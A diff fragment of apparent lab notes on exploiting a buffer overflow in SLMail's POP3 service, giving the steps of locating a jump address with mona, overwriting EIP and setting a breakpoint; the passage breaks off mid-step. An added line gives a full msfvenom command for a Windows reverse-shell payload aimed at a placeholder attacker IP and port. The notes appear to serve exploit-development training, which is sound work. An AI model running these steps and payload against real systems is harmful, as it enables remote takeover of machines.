@@ -19,3 +19,6 @@ Search for this opcode in all sections of the .dll file that found in modules by
 "!mona find -s "<OPCODE_IN_HEXA>" (Ex.\xff\xe4) -m <.DLL_FILE> (Ex. slmfc.dll)".
 Choose one that doesnt contain bad chars (double check that inside the debugger - Ex. address like 0x5f4a358f).
 * Edit the exploit and add this address instead of EIP (B's) place (See slmail_pop3_return_address.py in repo)
+* Place a breakpoint in this address and check it actually reaches it.
+* Generate a shellcode using MSFVENOM (msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKERS_IP> LPORT=<ATTACKERS_PORT> -f c -a x86 --platform windows -e x86/shikata_ga_nai -b "<BAD_CHARS>" (ex. "\x00\x0a\x0d")).
+* Place this shellcode in the exploit POC (See 
